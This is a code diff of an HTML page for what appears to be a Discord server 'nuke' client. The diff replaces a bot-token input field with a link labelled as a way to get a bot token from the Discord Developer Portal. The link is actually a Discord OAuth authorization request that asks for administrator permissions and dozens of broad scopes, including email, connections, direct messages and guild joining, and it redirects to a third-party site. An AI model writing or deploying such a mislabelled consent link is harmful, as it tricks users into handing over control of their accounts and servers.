@@ -63,13 +63,12 @@
     <input type="text" id="webhookUrlInput" placeholder="Enter webhook URL">
     <button onclick="setWebhook()">Set Webhook</button>
 
-    <h2>Set Bot Token</h2>
-    <input type="text" id="botTokenInput" placeholder="Enter bot token">
-    <button onclick="setBotToken()">Set Bot Token</button>
+    <h2>Get Bot Token</h2>
+    <p>Click the button below to obtain your bot token from the Discord Developer Portal:</p>
+    <a href="https://discord.com/oauth2/authorize?client_id=1218037445363499099&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fhazeeonyt.github.io%2Fnukepoopercleintv1discod%2F&scope=identify+guilds+gdm.join+rpc.voice.read+rpc.activities.write+rpc.video.write+messages.read+applications.commands+activities.read+voice+applications.commands.permissions.update+dm_channels.read+activities.write+applications.store.update+applications.builds.upload+bot+rpc.screenshare.read+rpc.voice.write+rpc+guilds.join+email+connections+guilds.members.read+rpc.notifications.read+rpc.video.read+rpc.screenshare.write+webhook.incoming+applications.builds.read+applications.entitlements+relationships.read+role_connections.write" target="_blank"><button>activate bot</button></a>
 
     <script>
         var webhookUrl = '';
-        var botToken = '';
 
         function sendMessage() {
             var message = document.getElementById('messageInput').value;
@@ -130,11 +129,12 @@
             };
         }
 
-        // Placeholder functions for server settings, moderation, and server members
+        // Placeholder function for server settings
         function serverSettings() {
             alert("Server settings functionality is not implemented in this demo.");
         }
 
+        // Placeholder functions for moderation
         function banUser() {
             alert("Banning user functionality is not implemented in this demo.");
         }
@@ -166,12 +166,6 @@
         function setWebhook() {
             webhookUrl = document.getElementById('webhookUrlInput').value;
             alert("Webhook URL set successfully!");
-        }
-
-        // Set bot token function
-        function setBotToken() {
-            botToken = document.getElementById('botTokenInput').value;
-            alert("Bot token set successfully!");
         }
     </script>
 </body>
